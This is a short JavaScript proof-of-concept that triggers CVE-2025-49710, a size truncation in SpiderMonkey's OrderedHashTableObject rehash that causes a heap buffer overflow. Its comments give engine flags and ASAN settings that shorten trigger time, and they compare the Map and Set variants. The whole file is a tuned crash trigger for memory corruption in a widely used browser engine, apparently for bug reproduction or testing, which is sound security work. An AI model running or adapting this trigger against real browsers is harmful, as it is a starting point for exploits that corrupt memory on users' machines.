// CVE-2025-49710 / Bug 1970095 — OrderedHashTableObject Rehash size_t→uint32_t
// truncation in AllocNurseryOrMallocBuffer; subsequent memcpy writes past the
// under-allocated buffer.
//
// 16x-unrolled Map.set loop reduces JIT dispatch overhead per insertion;
// combined with --ion-eager / --no-incremental-gc / --nursery-size=1024 and
// ASAN_OPTIONS=poison_heap=0:malloc_context_size=0:quarantine_size_mb=0,
// trigger time ≈ 100 s under ASAN (vs ~6 min for the original Bugzilla PoC).
//
// Set variant was tested and is slower (~150s+) — Map's larger Entry size
// reaches the truncation boundary in fewer rehash cycles.
let m = new Map();
let i = 0;
try {
    while (true) {
        m.set(i,    0); m.set(i+1,  0); m.set(i+2,  0); m.set(i+3,  0);
        m.set(i+4,  0); m.set(i+5,  0); m.set(i+6,  0); m.set(i+7,  0);
        m.set(i+8,  0); m.set(i+9,  0); m.set(i+10, 0); m.set(i+11, 0);
        m.set(i+12, 0); m.set(i+13, 0); m.set(i+14, 0); m.set(i+15, 0);
        i += 16;
    }
} catch (e) {}